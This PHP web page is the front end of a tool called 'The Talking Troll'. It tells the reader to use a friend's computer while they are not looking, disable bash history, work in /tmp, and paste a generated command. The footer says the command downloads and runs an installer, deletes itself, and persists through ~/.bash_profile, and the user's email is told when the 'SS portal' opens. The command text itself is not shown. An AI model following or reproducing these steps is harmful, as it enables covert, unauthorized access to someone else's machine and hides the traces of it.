<?php
require_once '../inc/config.inc';
?>

<!doctype html>
<html lang="es">
    <head>
        <meta charset="utf-8" />

        <title>The Talking Troll</title>

        <link rel="stylesheet" type="text/css" href="css/reset.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap-theme.min.css" />
        <link rel="stylesheet" type="text/css" href="css/site.css" />
    </head>

    <body>
        <header>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <h1>The Talking Troll</h1>
                    </div>
                </div>
            </div>
        </header>

        <section class="main">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <div class="msgs">

                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <form method="post">
                            <div class="form-group">
                                <label class="sr-only" for="email">Email address</label>
                                <input id="email" type="email" class="form-control" placeholder="Email" />
                            </div>
                            <button type="submit" class="btn btn-success form-control">Generate</button>
                        </form>
                    </div>
                </div>
                <div class="row result">
                    <div class="col-xs-12">
                        <input id="cmd" type="text" class="form-control" placeholder="Command" />
                        <button class="btn btn-primary form-control select-ctrl" select-target="#cmd">Select Command</button>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <div class="instructions">
                            <h2>Instructions:</h2>
                            <ol>
                                <li>Hop on your buddies computer when they're not looking</li>
                                <li>Navigate a web browser (incognito if you want to hide traffic) to <a href="<?php echo SERVER_HOST; ?>"><?php echo SERVER_HOST; ?></a></li>
                                <li>Enter <strong>your</strong> email and click "Generate"</li>
                                <li>Select &amp; copy the command given</li>
                                <li>Open the Terminal (open a new tab if Terminal is already running)</li>
                                <li>
                                    Disable bash history
                                    <pre> $ unset HISTFILE</pre>
                                </li>
                                <li>
                                    Use the tmp directory
                                    <pre> $ cd /tmp</pre>
                                </li>
                                <li>
                                    Paste your command and run! (Hit "ENTER")
                                    <pre id="instructions-cmd"> $ <?php echo parse_file_contents('cmd', 'XXXXXXXXXXXXXXXX', true); ?></pre>
                                </li>
                                <li>Close the terminal window opened by you</li>
                                <li>The email you used to generate the installer will be notified once the SS portal has successfully opened</li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <p>USE AT YOUR OWN RISK!</p>
                        <p>No rm or delete commands exist within this script (with the exception of the command above which removes itself after downloading and running).</p>
                        <p>Only applicable within a simple local network setting (without complex port forwarding)</p>
                        <p>This will append a line to ~/.bash_profile so it restarts with each new terminal session</p>
                    </div>
                </div>
            </div>
        </footer>

        <script type="text/javascript" src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/site.js"></script>
    </body>
</html>
